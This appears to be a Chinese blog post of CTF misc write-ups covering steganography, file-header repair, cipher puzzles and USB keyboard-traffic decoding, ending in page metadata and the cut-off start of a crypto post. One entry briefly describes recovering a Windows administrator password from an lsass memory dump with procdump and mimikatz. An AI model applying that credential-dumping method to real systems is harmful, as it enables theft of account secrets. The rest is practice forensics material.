123456789101112131415161718192021222324252627282930313233 ############## ## ## ########## ############## ## ## #### #### ###### ## ## ## ## ###### ## ###### ## ## ## ###### ## ## ###### ## #### ## ## ## ## ###### ## ## ###### ## ## ## ## #### ## ###### ## ## ## ## ## #### ## ## ############## ## ## ## ## ## ## ## ############## ## ## ## ########## ########## #### ## ## ###### ## ## ## ## #### ## ## ## ## ###### ############## #### ###### ## #### #### ## ## #### ## ###### #### ######## ###### ########## ## #### ######## ## ## ## ###### ###### #### ## ######## ## ## ## #### ########## #### ########## ## ## ## #### ## #### ########## #### ## ## ## ###### ## ## ## ###### #### #### ## #### #### ######## ## #### ###### ## #### #### ## ## ######## #### ## ## ## ## ## ## #### ###### #### ## ## ## #### #### ## ###################### ## #### #### ###### ## ## ###### ############## ###### ###### #### ## ## ## ## #### #### ## #### ## ## ###### ## #### ## #### #### ################## ## ###### ## ## ## #### ## ###### ## ########## ## #### #### ## ## ## ######## ## ## #### ## ## ## ############## ######## ########## #### ## ## 像一个二维码，放入notepad++，把空格替换为0，把#替换为1。使用脚本进行转换。 123456789101112131415161718from PIL import Imagelength = 58img = Image.new(&#x27;RGB&#x27;, (length*5, length*5))#黑点为1白点为0data = &quot;1111111111111100001100000011000011111111110011111111111111111111111111110000110000001100001111111111001111111111111111000000000011001111001111001111110011000000110000000000111100000000001100111100111100111111001100000011000000000011110011111100110000111111000000110000110000001100111111001111001111110011000011111100000011000011000000110011111100111100111111001100111100110011000000110000000011001111110011110011111100110011110011001100000011000000001100111111001111001111110011000000110011000000110011110000110011111100111100111111001100000011001100000011001111000011001111110011110000000000110011001100000000111100000000001100000000001111000000000011001100110000000011110000000000110000000000111111111111111100110011001100110011001100110011111111111111111111111111110011001100110011001100110011001111111111111100000000000000000000000011000011000000001100000000000000000000000000000000000000001100001100000000110000000000000000111111111100111111111100111100110011001111110011001100110011111111110011111111110011110011001100111111001100110011001100001111000011001100000011000011001111110011111111111111110000111100001100110000001100001100111111001111111111111111110000001111110011001111001111000011000011000011110011001111000000111111001100111100111100001100001100001111001100111111001111000011111111000011111100000000111111111100110011111100111100001111111100001111110000000011111111110011001111001111111100001100110011001111110000000000000011111100111100111111110000110011001100111111000000000000001111110011110000001100111111110011001100110011110011111111110011111111000000110011111111001100110011001111001111111111001111000011111111110011000000001100110000000011110011000011110000001111111111001100000000110011000000001111001100001111001111111111000011110011001100001100001111110000110011001100111111111100001111001100110000110000111111000011001100110011111100001111000000000011110011001111000000000000111100001111110000111100000000001111001100111100000000000011110000111111110000000011000000001111000000111111001100111100111111111111000000001100000000111100000011111100110011110011111100110011111111000000111100001100001100000000000000000000110011001111111100000011110000110000110000000000000000000011000011000000110000001100000011110011111100111100110000111100001100000011000000110000001111001111110011110011000011110011110000111100000011000000001111111111111111111111001111001111000011110000001100000000111111111111111111111100110000000000000000111100001111000011111100110000001100111111000000000000000011110000111100001111110011000000110011111111111111111111001111110000111111000000111100110011000000001111111111111100111111000011111100000011110011001100000000110000000000110000111100111100110000001111000000110000000011000000000011000011110011110011000000111100000011000000001100111111001100111100001100111100111100111111111111111111110011111100110011110000110011110011110011111111111111111111001111110011001100000000000000000000000011000000000011111100111111001100110000000000000000000000001100000000001111110011111100110011111111110000110000000000111100111100110011001111110011001111111111000011000000000011110011110011001100000000001100111111110000110011000011110011001100001100110000000000110011111111000011001100001111001100110000110011111111111111001111111100000011111111110011110011001100001111111111111100111111110000001111111111001111001100110000&quot;for x in range(length): for y in range(length): if data[x*length+y] == &#x27;1&#x27;: for xx in range(x*5, x*5+5): for yy in range(y*5, y*5+5): img.putpixel([xx, yy], (0,0,0)) else: for xx in range(x*5, x*5+5): for yy in range(y*5, y*5+5): img.putpixel([xx, yy], (255,255,255))img.save(&#x27;out.png&#x27;) 扫描之后拿到od -vtx1 ./draw.png | head -56 | tail -28。 放入kali执行。od是一个linux命令。 123456789101112131415161718192021222324252627280000700 01 00 02 10 03 10 00 00 01 ee c0 b8 a6 00 00 000000720 ff ff ff 00 ff ff ff ff 00 ff ff 00 00 00 ff ff0000740 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 000000760 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 000001000 ff ff 00 00 00 00 ff 00 00 ff 00 ff 00 ff 00 000001020 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 000001040 ff 00 ff 00 ff 00 ff 00 00 ff 00 ff 00 00 ff 000001060 ff ff ff 00 ff ff ff 00 00 ff ff 00 00 00 ff ff0001100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 000001120 ff ff ff 00 ff ff ff 00 ff ff ff 00 ff ff 00 000001140 ff 00 00 00 00 00 ff 00 00 00 ff 00 00 ff 00 000001160 ff ff ff 00 00 00 ff 00 ff ff ff 00 00 ff 00 000001200 00 00 ff 00 00 00 ff 00 ff 00 00 00 00 ff 00 000001220 ff ff ff 00 00 00 ff 00 ff ff ff 00 ff ff ff 000001240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 000001260 ff ff ff 00 ff 00 ff 00 ff ff ff 00 ff ff ff 000001300 ff 00 00 00 ff 00 ff 00 ff 00 ff 00 00 00 ff 000001320 ff ff ff 00 ff ff ff 00 ff ff ff 00 00 00 ff 000001340 00 00 ff 00 00 00 ff 00 00 00 ff 00 00 00 ff 000001360 ff ff ff 00 00 00 ff 00 ff ff ff 00 00 00 ff 000001400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 000001420 ff ff ff 00 ff ff 00 00 00 00 00 00 00 00 00 000001440 ff 00 00 00 00 ff 00 00 00 00 00 00 00 00 00 000001460 ff ff ff 00 00 ff 00 00 00 00 00 00 00 00 00 000001500 ff 00 ff 00 00 ff ff 00 00 00 00 00 00 00 00 000001520 ff 00 ff 00 00 ff 00 00 00 00 00 00 00 00 00 000001540 ff ff ff 00 00 ff 00 00 00 00 00 00 00 00 00 000001560 00 00 00 00 ff ff 00 63 da e9 3c 36 b1 aa 93 59 把 ff 高亮一下显示发现并不是二维码，直接显示的是 flag 的图像了，结果是 BJD{572154976}。 [BJDCTF2020]鸡你太美两个gif文件，一个损坏。 先对正常的进行分帧，没有发现异常。 1convert flag.gif flag.png 查看损坏的gif，使用file命令查看文件类型。 12root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;篮球副本.gif&#39; &#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;篮球副本.gif: data 放入winhex，发现少头，补充头部47 49 46 38。 [ACTF新生赛2020]outguess123456789101112131415root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# exif &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;mmm.jpg&#39; ‘&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;mmm.jpg’中的EXIF 信息标识(‘摩托罗拉’字节顺序):--------------------+----------------------------------------------------------信息标识 |值--------------------+----------------------------------------------------------XP Comment |公正民主公正文明公正和谐Padding |2060 bytes undefined dataX-Resolution |72Y-Resolution |72Resolution Unit |英寸Padding |2060 bytes undefined dataExif Version |Exif版本2.1FlashPixVersion |FlashPix版本 1.0色彩空间 |Internal error (unknown value 65535)--------------------+---------------------------------------------------------- 社会注意核心价值观，解码为abc。 123456root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# outguess -k abc -r &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;mmm.jpg&#39; out.txtReading &#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;mmm.jpg....Extracting usable bits: 17550 bitsSteg retrieve: seed: 93, len: 23root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# cat out.txt ACTF&#123;gue33_Gu3Ss!2020&#125; 直接stings 12345678910root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# strings &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;attachment.exe&#39; ; ;$;(;,;0;4;8;&lt;;@;D;H;L;T;X;\\;&#96;;d;Rar!CMT;Silent&#x3D;11.txtntfs flag.txt:flag.txtG3JV&quot; 发现很多信息，ntf、rar、flag.txt。使用binwalk，都没有什么发现，最后直接运行exe，生成一个txt，内容为： 12ntfs flag.txt 尝试ntfs隐写。 1C:\\Users\\12521\\Desktop\\CTF&gt;notepad 1.txt:flag.txt 直接拿到flag。 谁赢了比赛？发现一个rar。 1234567891011121314151617181920root@root:~&#x2F;桌面&#x2F;flag# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;who_won_the_game.png&#39; [?] 187692 bytes of extra data after image end (IEND), offset &#x3D; 0x15d2dcextradata:0 .. file: RAR archive data, v4, os: Win32 00000000: 52 61 72 21 1a 07 00 cf 90 73 00 00 0d 00 00 00 |Rar!.....s......| 00000010: 00 00 00 00 95 d3 74 44 94 35 00 90 dc 02 00 de |......tD.5......| 00000020: 3c 03 00 02 46 d1 ab e2 bd 6a 13 47 1d 33 08 00 |&lt;...F....j.G.3..| 00000030: 20 00 00 00 68 65 68 65 2e 67 69 66 00 04 f8 fe | ...hehe.gif....| 00000040: 42 6c d0 8d 00 b0 74 6c 37 34 b2 f5 0e 79 c4 24 |Bl....tl74...y.$| 00000050: 44 d5 0c 9d ba eb 18 46 c1 5d 76 a2 36 18 a2 cf |D......F.]v.6...| 00000060: 38 6a 95 46 83 30 71 d7 67 36 ac 72 31 e3 b9 92 |8j.F.0q.g6.r1...| 00000070: b5 2f c7 b9 55 a9 59 ed 54 a8 23 d6 80 2a 42 ff |.&#x2F;..U.Y.T.#..*B.| 00000080: 18 04 c2 f4 ba 07 9e 81 5e a3 4f 87 0c f1 50 47 |........^.O...PG| 00000090: 3d e9 c8 7d 35 bb a0 63 32 38 20 9a 38 c9 72 aa |&#x3D;..&#125;5..c28 .8.r.| 000000a0: 9e 11 56 90 86 73 45 c5 50 51 0f 6a 67 80 9d 47 |..V..sE.PQ.jg..G| 000000b0: 28 05 51 20 25 33 bf ba a2 0e 02 a8 a0 2d 43 fa |(.Q %3.......-C.| 000000c0: 4b 8d 1a bb fd 33 4b 83 2d aa 14 0b 9c 32 34 ef |K....3K.-....24.| 000000d0: 3f f5 46 75 00 61 44 b5 77 cc d9 e9 7e 36 ee da |?.Fu.aD.w...~6..| 000000e0: 54 3d d0 20 e5 a1 75 57 3f 47 a6 d5 b3 60 8e 4b |T&#x3D;. ..uW?G...&#96;.K| 000000f0: 38 6f 6a 1e 14 bc a0 f6 bb 7b 46 5e 90 49 36 d6 |8oj......&#123;F^.I6.|imagedata .. text: &quot;888999999&quot; 压缩包爆破拿到密码。 一个gif。分帧。 1root@root:~&#x2F;桌面&#x2F;flag# convert &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;hehe.gif&#39; flag.png 其中有一个png文件。写有where flag？ 对其进行分析。在red 0通道发现二维码扫描，拿到flag。使用zsteg发现不了二维码。 喵喵喵使用zsteg，发现red 0有猫腻，直接data extract提取数据，发现是个png，二维码。保存修改高度，扫码。 rbg0、msb、bgr通道。用stegsolve进行颜色对换后得到一张正常的二维码，扫描后下载百度网盘的文件：flag.rar。 flag.txt内容： 1flag不在这里哦 你猜猜flag在哪里呢？ 找找看吧 ntf隐写，使用rar解压，ntfs工具。拿到一个pyc文件，反编译。 1steady@steady:~$ &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;tools&#x2F;python-uncompyle6-master&#x2F;bin&#x2F;uncompyle6 &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;4.pyc 12345678910111213141516171819import base64def encode(): flag &#x3D; &#39;*************&#39; ciphertext &#x3D; [] for i in range(len(flag)): s &#x3D; chr(i ^ ord(flag[i])) if i % 2 &#x3D;&#x3D; 0: s &#x3D; ord(s) + 10 else: s &#x3D; ord(s) - 10 ciphertext.append(str(s)) return ciphertext[::-1]ciphertext &#x3D; [ &#39;96&#39;, &#39;65&#39;, &#39;93&#39;, &#39;123&#39;, &#39;91&#39;, &#39;97&#39;, &#39;22&#39;, &#39;93&#39;, &#39;70&#39;, &#39;102&#39;, &#39;94&#39;, &#39;132&#39;, &#39;46&#39;, &#39;112&#39;, &#39;64&#39;, &#39;97&#39;, &#39;88&#39;, &#39;80&#39;, &#39;82&#39;, &#39;137&#39;, &#39;90&#39;, &#39;109&#39;, &#39;99&#39;, &#39;112&#39;] 写脚本，拿到flag。 [BJDCTF 2nd]TARGZ-y1ng压缩包名字就是压缩密码。 1234567import zipfilename &#x3D; &#39;hW1ES89jF&#39;while True: fz &#x3D; zipfile.ZipFile(name + &#39;.zip&#39;, &#39;r&#39;) fz.extractall(pwd&#x3D;bytes(name, &#39;utf-8&#39;)) name &#x3D; fz.filelist[0].filename[0:9] fz.close() [GXYCTF2019]gakkibinwalk分析，拿到压缩包，爆破，解压一个txt大量的字符，尝试词频分析。 12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- coding: UTF-8 -*-def processLine(line, CharacterCounts): for character in line: #if ord(character) in range(97, 123): if ord(character) in range(32,126): CharacterCounts[character] +&#x3D; 1 #创建字母字典def createCharacterCounts(CharacterCounts): #for i in range(97, 123): for i in range(32, 126): CharacterCounts[chr(i)] &#x3D; 0 def main(): #用户输入一个文件名 # filename &#x3D; input(&quot;enter a filename:&quot;).strip() filename &#x3D; &quot;flag.txt&quot; infile &#x3D; open(filename, &quot;r&quot;) #建立用于计算词频的空字典 CharacterCounts &#x3D; &#123;&#125; #初始化字典键值 createCharacterCounts(CharacterCounts) for line in infile: #processLine(line.lower(), CharacterCounts) processLine(line, CharacterCounts) #从字典中获取数据对 pairs &#x3D; list(CharacterCounts.items()) #列表中的数据对交换位置,数据对排序 items &#x3D; [[x,y] for (y,x) in pairs] items.sort(reverse&#x3D;True) #输出count个数词频结果 for i in range(len(items)): #print(items[i][1]+&quot;\\t&quot;+str(items[i][0])) print(items[i][1],end&#x3D;&#39;&#39;) infile.close() if __name__ &#x3D;&#x3D; &#39;__main__&#39;: main() 或者 123456789101112131415161718# -*- coding:utf-8 -*-#Author: mochu7alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\\\&#123;\\\\&#125;[]&quot;strings = open(&#x27;./flag.txt&#x27;).read()result = &#123;&#125;for i in alphabet: counts = strings.count(i) i = &#x27;&#123;0&#125;&#x27;.format(i) result[i] = countsres = sorted(result.items(),key=lambda item:item[1],reverse=True)for data in res: print(data)for i in res: flag = str(i[0]) print(flag[0],end=&quot;&quot;) [HBNIS2018]excel破解stings CTF [SWPU2019]伟大的侦探一个压缩包，01editor 选择 EBCDIC编码得到压缩包的密码。 福尔摩斯里面的跳舞的小人加密。 弱口令一个压缩包有弱口令，爆破不出来，查看注释，莫斯密码，放入sublim。解码拿到密码。 1.... . .-.. .-.. ----- ..-. --- .-. -- 一张png图片。lsb隐写。 123root@root:~&#x2F;桌面&#x2F;cloacked-pixel-master# python .&#x2F;lsb.py extract &#39;&#x2F;root&#x2F;桌面&#x2F;cloacked-pixel-master&#x2F;女神.png&#39; flag.txt 123456[+] Image size: 500x500 pixels.[+] Written extracted data to flag.txt. [ACTF新生赛2020]base64隐写1234567891011121314151617181920212223242526272829303132333435def get_base64_diff_value(s1, s2): base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27; res = 0 for i in xrange(len(s2)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open(&#x27;./flag.txt&#x27;, &#x27;rb&#x27;) as f: file_lines = f.readlines() bin_str = &#x27;&#x27; for line in file_lines: steg_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;) norm_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;).decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;) diff = get_base64_diff_value(steg_line, norm_line) print diff pads_num = steg_line.count(&#x27;=&#x27;) if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += &#x27;0&#x27; * pads_num * 2 print goflag(bin_str)def goflag(bin_str): res_str = &#x27;&#x27; for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i + 8], 2)) return res_strif __name__ == &#x27;__main__&#x27;: solve_stego() [HBNIS2018]来题中等的吧只有大横杆和小横杆，猜测摩斯密码，解密拿到flag。 黑客帝国一个txt，一串十六进制，开头是526172211a。rar文件头导入01，需要密码，爆破。 解压得到一张png图片，hex分析，没有IHDR，而是JFIF，且为FF D9结尾，篡改了文件头，将89 50 4e 47改为ff d8 ff e0。 [WUSTCTF2020]find_meexif查看信息，盲文密码。解密。 1234567891011121314151617181920212223242526272829303132333435ExifTool Version Number : 12.07File Name : attachment.jpgDirectory : /home/steady/桌面/steadyFile Size : 127 kBFile Modification Date/Time : 2020:11:05 11:39:24+08:00File Access Date/Time : 2020:11:05 11:40:28+08:00File Inode Change Date/Time : 2020:11:05 11:40:28+08:00File Permissions : rw-------File Type : JPEGFile Type Extension : jpgMIME Type : image/jpegExif Byte Order : Big-endian (Motorola, MM)Software : Adobe Photoshop CC 2018 (Windows)Artist : 52HeRtzXP Comment : ⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍=Padding : (Binary data 1910 bytes, use -b option to extract)XMP Toolkit : Adobe XMP Core 5.6-c142 79.160924, 2017/07/13-01:06:39Authors Position : 52HeRtzCreator Tool : Adobe Photoshop CC 2018 (Windows)Creator : 52HeRtzCurrent IPTC Digest : 2adef26c2475bb7c4db0fe45a2cbd2bdCoded Character Set : UTF8Application Record Version : 4Object Name : Congratulations！By-line : 52HeRtzBy-line Title : 52HeRtzIPTC Digest : 2adef26c2475bb7c4db0fe45a2cbd2bdImage Width : 482Image Height : 482Encoding Process : Baseline DCT, Huffman codingBits Per Sample : 8Color Components : 3Y Cb Cr Sub Sampling : YCbCr4:4:4 (1 1)Image Size : 482x482Megapixels : 0.232 [MRCTF2020]你能看懂音符吗压缩包不能打开，修改头部，打开之后，打开之后document.XML发现音符，解码拿到flag。 看网课视频分帧，拿到敲击码。 以/为分割。先行，后列。 123..... ..&#x2F;... .&#x2F;... .&#x2F;... ..&#x2F; 5,3 3,1 3,1 3,2 W L L M 在第7.36s发现第二段信息：dXBfdXBfdXA=。 使用这个密码解压flag2.zip，解压得到Real flag,jpg，使用010 Ediotr打开搜索关键词ctf即可得到flag。 [HBNIS2018]低个头1234567题目：低个头描述：EWAZX RTY TGB IJN IO KL 请破解该密文 flag格式：XXX 明文提交：直接提交明文（大写） 键盘密码。 间谍启示录运行exe，拿到flag。 我吃三明治binwalk分析 123456steady@steady:~/桌面/steady$ binwalk /home/steady/桌面/steady/flag.jpgDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.0137475 0x9263 JPEG image data, JFIF standard 1.01 1strings 1.jpg 发现一串字符。 1MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2 base32解密。 1234import base64 print base64.b32encode(&quot;hello world&quot;)print base64.b32decode(&quot;MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2&#x3D;&#x3D;&#x3D;&quot;) base32解密一定要注意后面=的个数。 [DDCTF2018](╯°□°）╯︵ ┻━┻123456(╯°□°）╯︵ ┻━┻50pt(╯°□°）╯︵ ┻━┻d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd 长度为134的字符串，按每两位截取的十六进制 12[&#39;d4&#39;, &#39;e8&#39;, &#39;e1&#39;, &#39;f4&#39;, &#39;a0&#39;, &#39;f7&#39;, &#39;e1&#39;, &#39;f3&#39;, &#39;a0&#39;, &#39;e6&#39;, &#39;e1&#39;, &#39;f3&#39;, &#39;f4&#39;, &#39;a1&#39;, &#39;a0&#39;, &#39;d4&#39;, &#39;e8&#39;, &#39;e5&#39;, &#39;a0&#39;, &#39;e6&#39;, &#39;ec&#39;, &#39;e1&#39;, &#39;e7&#39;, &#39;a0&#39;, &#39;e9&#39;, &#39;f3&#39;, &#39;ba&#39;, &#39;a0&#39;, &#39;c4&#39;, &#39;c4&#39;, &#39;c3&#39;, &#39;d4&#39;, &#39;c6&#39;, &#39;fb&#39;, &#39;b9&#39;, &#39;b2&#39;, &#39;b2&#39;, &#39;e1&#39;, &#39;e2&#39;, &#39;b9&#39;, &#39;b9&#39;, &#39;b7&#39;, &#39;b4&#39;, &#39;e1&#39;, &#39;b4&#39;, &#39;b7&#39;, &#39;e3&#39;, &#39;e4&#39;, &#39;b3&#39;, &#39;b2&#39;, &#39;b2&#39;, &#39;e3&#39;, &#39;e6&#39;, &#39;b4&#39;, &#39;b3&#39;, &#39;e2&#39;, &#39;b5&#39;, &#39;b0&#39;, &#39;b6&#39;, &#39;b1&#39;, &#39;b0&#39;, &#39;e6&#39;, &#39;e1&#39;, &#39;e5&#39;, &#39;e1&#39;, &#39;b5&#39;, &#39;fd&#39;]1 转换为10进制 12[212, 232, 225, 244, 160, 247, 225, 243, 160, 230, 225, 243, 244, 161, 160, 212, 232, 229, 160, 230, 236, 225, 231, 160, 233, 243, 186, 160, 196, 196, 195, 212, 198, 251, 185, 178, 178, 225, 226, 185, 185, 183, 180, 225, 180, 183, 227, 228, 179, 178, 178, 227, 230, 180, 179, 226, 181, 176, 182, 177, 176, 230, 225, 229, 225, 181, 253]1 可以发现都是大于128的数，把所有数-128得到ASCII码 12[84, 104, 97, 116, 32, 119, 97, 115, 32, 102, 97, 115, 116, 33, 32, 84, 104, 101, 32, 102, 108, 97, 103, 32, 105, 115, 58, 32, 68, 68, 67, 84, 70, 123, 57, 50, 50, 97, 98, 57, 57, 55, 52, 97, 52, 55, 99, 100, 51, 50, 50, 99, 102, 52, 51, 98, 53, 48, 54, 49, 48, 102, 97, 101, 97, 53, 125]1 ASCII码转换为字符 1That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125; 百里挑一流量分析。导出http，许多图片。 12steady@steady:~/桌面/steady/CTF$ exiftool * | grep &quot;flag&quot;XP Comment : 恭喜你！找到一半了，还有另一半哦！flag&#123;ae58d0408e26e8f 另一个在tcp流中找到。 [WUSTCTF2020]alison_likes_jojoAs we known, Alison is a pretty girl。 在boki.jpg中发现zip，用binwalk命令分离暴力破解后得到： 1WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09 base64 decode后得到： 1killerqueen jljy.jpg，outguess隐写 1outguess -k &quot;killerqueen&quot; -r jljy.jpg out.txt [安洵杯 2019]Attack流量包，导出http对象。其中有一个lsass.dmp，分析流量发现使用了。procdump.exe这个工具。该工具一般用来抓取windows的lsass进程中的用户明文密码。 1lsass.exe是一个系统重要进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略。 获取里面的系统administrator密码，使用mimikatz。 USB其中一个文件binwalk分析。 12345678steady@steady:~/桌面/steady$ binwalk -e /home/steady/桌面/steady/key.ftmDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------34741 0x87B5 Zip archive data, at least v2.0 to extract, compressed size: 4478, uncompressed size: 37254, name: key.pcap39347 0x99B3 End of Zip archive, footer length: 2240037 0x9C65 Zip archive data, at least v2.0 to extract, compressed size: 4478, uncompressed size: 37254, name: key.pcap44643 0xAE63 End of Zip archive, footer length: 22 提示usb，就是usb流量。 1tshark.exe -r C:\\Users\\12521\\Desktop\\key.pcap -T fields -e usb.capdata &gt;flag.txt 使用脚本提取信息，有冒号–int(line[6:8]，如果没有冒号，int(line[4:6])。 123456789101112131415161718192021mappings = &#123; 0x04:&quot;A&quot;, 0x05:&quot;B&quot;, 0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;, 0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;, 0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;, 0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;, 0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;\\n&quot;, 0x2a:&quot;[DEL]&quot;, 0X2B:&quot; &quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;, 0x30:&quot;]&quot;, 0x31:&quot;\\\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;, 0x34:&quot;&#x27;&quot;, 0x36:&quot;,&quot;, 0x37:&quot;.&quot; &#125;nums = []keys = open(&#x27;out.txt&#x27;)for line in keys: if line[0]!=&#x27;0&#x27; or line[1]!=&#x27;0&#x27; or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27;: continue nums.append(int(line[6:8],16))keys.close()output = &quot;&quot;for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += &#x27;[unknown]&#x27;print &#x27;output :\\n&#x27; + output 得到 KEYXINAN维吉尼亚密码：key=XINAN， message = ci&#123;v3erf_0tygidv2_fc0&#125; 栅栏密码解密。","categories":[{"name":"CTF-杂项","slug":"CTF-杂项","permalink":"http://s1eady.top/categories/CTF-%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"CTF-杂项","slug":"CTF-杂项","permalink":"http://s1eady.top/tags/CTF-%E6%9D%82%E9%A1%B9/"}]},{"title":"CTF-Crypto刷题1","slug":"CTF-Crypto刷题2","date":"2019-05-12T19:19:44.000Z","updated":"2020-11-15T10:00:46.291Z","comments":true,"path":"2019/05/13/CTF-Crypto刷题2/","link":"","permalink":"http://s1eady.top/2019/05/13/CTF-Crypto%E5%88%B7%E9%A2%982/","excerpt":"","text":"CTF-密码题Base64this base64?给了一个新的编码表 1234码表：&#x27;JKLMNOxyUVzABCDEFGH789PQIabcdefghijklmWXYZ0123456RSTnopqrstuvw+/=&#x27;chipertext:FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw 1234567891011import base64dict=&#123;0: &#x27;J&#x27;, 1: &#x27;K&#x27;, 2: &#x27;L&#x27;, 3: &#x27;M&#x27;, 4: &#x27;N&#x27;, 5: &#x27;O&#x27;, 6: &#x27;x&#x27;, 7: &#x27;y&#x27;, 8: &#x27;U&#x27;, 9: &#x27;V&#x27;, 10: &#x27;z&#x27;, 11: &#x27;A&#x27;, 12: &#x27;B&#x27;, 13: &#x27;C&#x27;, 14: &#x27;D&#x27;, 15: &#x27;E&#x27;, 16: &#x27;F&#x27;, 17: &#x27;G&#x27;, 18: &#x27;H&#x27;, 19: &#x27;7&#x27;, 20: &#x27;8&#x27;, 21: &#x27;9&#x27;, 22: &#x27;P&#x27;, 23: &#x27;Q&#x27;, 24: &#x27;I&#x27;, 25: &#x27;a&#x27;, 26: &#x27;b&#x27;, 27: &#x27;c&#x27;, 28: &#x27;d&#x27;, 29: &#x27;e&#x27;, 30: &#x27;f&#x27;, 31: &#x27;g&#x27;, 32: &#x27;h&#x27;,33: &#x27;i&#x27;, 34: &#x27;j&#x27;, 35: &#x27;k&#x27;, 36: &#x27;l&#x27;, 37: &#x27;m&#x27;, 38: &#x27;W&#x27;, 39: &#x27;X&#x27;, 40: &#x27;Y&#x27;, 41: &#x27;Z&#x27;, 42: &#x27;0&#x27;, 43: &#x27;1&#x27;, 44: &#x27;2&#x27;, 45: &#x27;3&#x27;, 46: &#x27;4&#x27;, 47: &#x27;5&#x27;, 48: &#x27;6&#x27;, 49: &#x27;R&#x27;, 50: &#x27;S&#x27;, 51: &#x27;T&#x27;, 52: &#x27;n&#x27;, 53: &#x27;o&#x27;, 54: &#x27;p&#x27;, 55: &#x27;q&#x27;, 56: &#x27;r&#x27;, 57: &#x27;s&#x27;, 58: &#x27;t&#x27;, 59: &#x27;u&#x27;, 60: &#x27;v&#x27;, 61: &#x27;w&#x27;, 62: &#x27;+&#x27;, 63: &#x27;/&#x27;, 64: &#x27;=&#x27;&#125;base64_list = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, 